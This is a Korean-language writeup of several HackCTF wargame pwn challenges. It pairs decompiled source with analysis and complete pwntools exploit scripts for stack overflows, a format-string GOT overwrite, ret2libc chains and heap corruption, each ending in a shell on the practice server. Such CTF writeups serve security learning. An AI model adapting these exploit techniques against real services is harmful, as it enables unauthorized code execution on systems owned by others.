---
title: "HackCTF Pwn Challenges Writeup"
date: 2019-08-01
description: "HackCTF pwn category solutions: basic BOF, format string bugs, heap exploitation (tcache), RTL chaining, and x64 buffer overflow"
tags: ["HackCTF", "pwn", "buffer-overflow", "format-string", "heap", "RTL", "wargame"]
platform: "wargame"
category: "pwn"
difficulty: "easy-medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Basic BOF #1

### 바이너리 정보

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### 소스

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [esp+4h] [ebp-34h]
  int v5;     // [esp+2Ch] [ebp-Ch]

  v5 = 0x4030201;
  fgets(&s, 45, stdin);
  printf("\n[buf]: %s\n", &s);
  printf("[check] %p\n", v5);
  if ( v5 != 0x4030201 && v5 != 0xDEADBEEF )
    puts("\nYou are on the right way!");
  if ( v5 == 0xDEADBEEF )
  {
    puts("Yeah dude! You win!\nOpening your shell...");
    system("/bin/dash");
  }
  return 0;
}
```

### 분석

버퍼 `s`는 40바이트다. `v5`는 `ebp-0xC`에 위치하는데, 이는 `s`의 시작(`ebp-0x34`)보다 40바이트 위다. `s`를 정확히 40바이트 오버플로우하면 `v5`에 도달하여 `0xDEADBEEF`로 덮어쓸 수 있고, 셸을 얻는다.

### 익스플로잇

```python
from pwn import *

e = ELF("./bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3000)

payload = b"A" * 40 + p32(0xdeadbeef)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## Basic BOF #2

### 바이너리 정보

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### 소스

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[80];        // [esp+Ch] [ebp-8Ch]
  void (*v5)(void);  // [esp+8Ch] [ebp-Ch]

  v5 = (void (*)(void))sup;
  fgets(s, 133, stdin);
  v5();
  return 0;
}
```

### 분석

`v5`는 `sup`(무해한 함수)으로 초기화된 함수 포인터다. `ebp-0xC`에 위치하는데, 이는 버퍼 시작(`ebp-0x8C`)보다 `0x80` = 128바이트 위다. 버퍼는 80바이트이고, `s`의 끝과 `v5` 사이의 간격은 `128 - 80 = 48`바이트다.

80 + 48 = 128바이트를 오버플로우하고 셸을 실행하는 함수의 주소를 쓰면 `v5()` 호출이 해당 함수로 리다이렉트된다.

```
shell = 0x804849b  # win 함수의 주소
```

### 익스플로잇

```python
from pwn import *

e = ELF("./bof_basic2")
r = remote("ctf.j0n9hyun.xyz", 3001)
shell = 0x804849b

payload = b"A" * 80 + b"B" * 48 + p32(shell)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## Basic FSB

### 바이너리 정보

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

### 소스

```c
int flag()
{
  puts("EN)you have successfully modified the value :)");
  return system("/bin/sh");
}

int vuln()
{
  char s[1024];
  char format;

  printf("input : ");
  fgets(s, 1024, stdin);
  snprintf(&format, 0x400u, s);
  return printf(&format);  // format string bug
}
```

### 분석

사용자 입력 `s`가 `snprintf`로 `format`에 복사된 뒤, 그대로 `printf`에 전달된다. 이것은 전형적인 포맷 스트링 취약점이다 — 공격자가 포맷 스트링을 제어하므로 임의의 주소에 임의의 값을 쓸 수 있다.

목표는 `printf`의 GOT 엔트리를 `flag()`의 주소로 덮어쓰는 것이다. 그러면 다음 `printf` 호출이 셸 대신 실행된다.

- `printf` GOT: `e.got['printf']`
- `flag` 주소: `0x80485b4`
- 포맷 스트링 오프셋: `2` (`%1$x`, `%2$x`, ...로 탐색하여 결정)

pwntools의 `fmtstr_payload`가 write-what-where 페이로드 구성을 자동화한다.

### 익스플로잇

```python
from pwn import *

e = ELF("./basic_fsb")
r = remote("ctf.j0n9hyun.xyz", 3002)
printf_got = e.got['printf']
flag = 0x80485b4
offset = 2

payload = fmtstr_payload(offset, {printf_got: flag})
r.sendline(payload)
r.interactive()
```

```
input : EN)you have successfully modified the value :)
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## x64 Buffer Overflow

### 바이너리 정보

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### 소스

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[268]; // [rsp+10h] [rbp-110h]
  int v5;      // [rsp+11Ch] [rbp-4h]

  _isoc99_scanf("%s", s, envp);
  v5 = strlen(s);
  printf("Hello %s\n", s);
  return 0;
}
```

### 분석

버퍼는 `0x110` = 272바이트지만, `rbp-0x110`에 8바이트 저장된 RBP가 있으므로 리턴 주소는 `s`에서 272 + 8 = 280바이트 오프셋에 있다. `scanf("%s")`는 길이 제한이 없으므로 곧바로 ROP 기반 오버플로우가 가능하다.

카나리도 없고 PIE도 없으므로, `0x400606`에 있는 숨겨진 `callMeMaybe` 함수를 직접 호출할 수 있다. x86-64이므로 첫 번째 인자는 `rdi`에 들어가야 하지만, 인자가 필요 없는 가장 단순한 경우에는 오프셋 패딩 뒤에 함수 주소만 있으면 된다:

```
offset = 280
payload = "A" * 280 + p64(callMeMaybe)
```

### 익스플로잇

```python
from pwn import *

e = ELF("./64bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3004)
offset = 280
pr_rdi = 0x400713
callMeMaybe = 0x400606

payload = b"A" * offset + p64(callMeMaybe)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## beginner_heap

### 바이너리 정보

```
Arch:     amd64-64-little
NX:       NX enabled
Stack canary present
```

### 소스

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  void *v3;  // [rsp+10h] [rbp-1020h]
  void *v4;  // [rsp+18h] [rbp-1018h]
  char s[4104];

  v3 = malloc(16);
  *v3 = 1;
  *(v3 + 1) = malloc(8);   // v3의 내부 버퍼

  v4 = malloc(16);
  *v4 = 2;
  *(v4 + 1) = malloc(8);   // v4의 내부 버퍼

  fgets(s, 4096, stdin);
  strcpy(*(v3 + 1), s);    // 8바이트 버퍼로 무검사 복사

  fgets(s, 4096, stdin);
  strcpy(*(v4 + 1), s);

  exit(0);
}
```

### 분석

각 "노드"는 16바이트 힙 청크다: 처음 8바이트는 정수 ID를, 다음 8바이트는 8바이트 내부 버퍼에 대한 포인터를 담는다. 첫 번째 `strcpy`는 최대 4096바이트를 `v3`의 8바이트 내부 버퍼로 복사하여 힙 위로 오버플로우한다.

`v3`의 내부 버퍼(8바이트) 바로 다음에 `v4`의 16바이트 청크가 있으므로, 오버플로우로 `v4`의 필드 — 특히 `*(v4 + 1)`의 포인터 — 를 덮어쓸 수 있다. 두 번째 `strcpy`는 `*(v4 + 1)`이 이제 가리키는 주소에 쓰게 되어 write-what-where 프리미티브가 생긴다.

목표는 `get_flag` — 플래그를 읽고 출력하는 함수다. 두 번째 쓰기가 함수 포인터(또는 `exit`를 통해 접근할 수 있는 GOT 엔트리)를 덮어쓰도록 유도하면 `get_flag`가 실행된다.

glibc ≥ 2.26의 tcache 할당자는 동일 크기의 해제된 청크를 즉시 재활용하므로, 이 단순한 경우에서 레이아웃은 결정론적이다.

---

## RTL_core

### 바이너리 정보

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### 소스

```c
int __cdecl check_passcode(int a1)
{
  int v2 = 0;
  for ( int i = 0; i <= 4; ++i )
    v2 += *(_DWORD *)(4 * i + a1);
  return v2;
}

ssize_t core()
{
  int buf;
  // ...
  void *v4 = dlsym((void *)0xFFFFFFFF, "printf");
  printf(&format, v4);          // printf 주소를 누출
  return read(0, &buf, 0x64u);  // BOF
}

int main(int argc, const char **argv, const char **envp)
{
  char s[24];
  gets(s);                                  // 무검사 읽기
  if ( check_passcode((int)s) == hashcode ) // hashcode = 3235492007
    core();
}
```

### Stage 1 — 패스코드 우회

`check_passcode`는 입력 버퍼에서 시작하는 연속된 32비트 정수 다섯 개를 더하여 `hashcode = 3235492007`과 비교한다.

`3235492007 / 5 = 647098401` 나머지 `2`. 따라서 같은 값 네 개에 2가 더 큰 값 하나를 더하면 합이 맞는다:

```
data = 0x2691f021  # 647098401
payload = p32(data) * 4 + p32(data + 2)
```

### Stage 2 — ret2libc

패스코드 검사를 통과하면 `core()`는 `dlsym`을 통해 `printf`의 런타임 주소를 누출한 뒤, 62바이트 버퍼(`buf`는 `ebp-0x3E`)로 100바이트를 읽어 38바이트 오버플로우를 허용한다.

누출된 `printf` 주소를 사용해 libc 베이스를 계산하고 `system`과 `/bin/sh` 오프셋을 구한다. return-to-libc 체인:

```
[패딩 66B] [system] [AAAA] [/bin/sh]
```

### 전체 익스플로잇

```python
from pwn import *

context.arch = 'i386'
p = process("./rtlcore")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# Stage 1
data = 0x2691f021
payload = p32(data) * 4 + p32(data + 2)
p.recvuntil("Passcode: ")
p.sendline(payload)

# printf 누출
p.recvuntil("0x")
printf = int(p.recv(8), 16)
print("printf addr:", hex(printf))

libc_base  = printf - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b"/bin/sh"))

# Stage 2
payload2 = b"A" * 66
payload2 += p32(system_addr)
payload2 += b"AAAA"
payload2 += p32(binsh_addr)
p.sendline(payload2)
p.interactive()
```

```
$ id
uid=1000(phantom) gid=1000(phantom) groups=1000(phantom)
```

---

## gift

### 바이너리 정보

```
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### 소스

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[128];

  printf("Hey guyssssssssss here you are: %p %p\n", &binsh, &system);
  fgets(s, 128, stdin);
  printf(s);   // 포맷 스트링 취약점 (여기서는 미사용)
  gets(s);     // 무제한 읽기 — BOF
  return 0;
}
```

### 분석

바이너리가 두 주소를 먼저 알려준다: `&binsh`(`/bin/sh` 문자열이 들어갈 쓰기 가능한 전역 버퍼)와 `&system`(`system()`에 대한 포인터). 주의할 점은 `&binsh`가 문자열 자체를 가리키는 포인터가 아니라 — `/bin/sh`를 먼저 써야 하는 **버퍼** 자체라는 것이다.

두 단계 익스플로잇:
1. `gets@plt`를 사용해 `binsh` 버퍼에 `/bin/sh\x00`을 쓴다 (가젯: `pop ret`으로 인자를 정리한다).
2. `system(binsh)`을 RTL로 호출한다.

`s`에서 저장된 EIP까지의 오버플로우 오프셋은 `128 + 4(저장된 EBP) = 136`바이트다.

### 익스플로잇

```python
from pwn import *

p = process("./gift")
e = ELF("./gift")
context.arch = 'i386'

p.recvuntil("Hey guyssssssssss here you are: ")
data = p.recvline().split()
binsh  = int(data[0], 16)
system = int(data[1], 16)

popret    = 0x080483ad
gets_plt  = e.plt['gets']

# fgets 입력 처리 (포맷 스트링 단계)
p.sendline(b"A" * 4)

# gets를 통한 BOF: gets(binsh)를 호출한 뒤 system(binsh)를 호출
payload  = b"A" * 136
payload += p32(gets_plt)
payload += p32(popret)
payload += p32(binsh)
payload += p32(system)
payload += b"BBBB"
payload += p32(binsh)

p.sendline(payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
```

```
$ id
uid=1000(phantom) gid=1000(phantom) groups=1000(phantom)
```

---

## fengshui

### 바이너리 정보

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### 소스 개요

Add, Delete, Display, Update 네 가지 연산을 가진 힙 관리 문제다.

```c
// add_location: 가변 크기 설명 버퍼 + 고정 0x80 메타데이터 청크 할당
_DWORD *__cdecl add_location(size_t a1)
{
  void *s  = malloc(a1);      // 설명 버퍼 (사용자 제어 크기)
  _DWORD *v3 = malloc(0x80);  // 메타데이터 청크
  *v3 = s;                    // v3[0] = 설명 포인터
  // v3[4..] = 이름 (최대 124바이트)
  *(&store + cnt) = v3;
  update_desc(cnt++);
  return v3;
}

// update_desc: 설명 버퍼로의 경계 검사 쓰기
unsigned int __cdecl update_desc(unsigned __int8 a1)
{
  int v3 = 0;
  scanf("%u%c", &v3, &v2);
  // 보호: 메타데이터 청크에 닿는 쓰기를 거부
  if ( (char *)(v3 + *v3_desc_ptr) >= (char *)metadata_ptr - 4 )
  {
    puts("Nah...");
    exit(1);
  }
  read_len(*desc_ptr, v3 + 1);
}
```

### 취약점

`update_desc`의 경계 검사는 요청된 쓰기의 끝을 메타데이터 포인터 마이너스 4와 비교한다. 특정 크기의 청크를 신중하게 할당하면 한 위치에서 해제된 설명 버퍼가 다음 할당의 메타데이터 청크로 재활용된다(tcache/fastbin 재사용). 이를 통해 설명 쓰기가 다른 위치의 `*v3` 필드(설명 포인터)를 덮어쓸 수 있다.

포인터가 손상되면 `display_location` 호출이 힙이나 libc 주소를 누출하고, 후속 `update_desc`가 임의의 주소에 쓸 수 있게 된다 — GOT 덮어쓰기나 유사한 기법으로 셸로 실행 흐름을 바꿀 수 있다.

정확한 페이로드는 libc 버전과 런타임 힙 레이아웃에 따라 다르며, 일반적인 프리미티브는 다음과 같다: **힙 오버플로우 → 포인터 손상 → 임의 쓰기 → GOT 덮어쓰기 → 셸**.
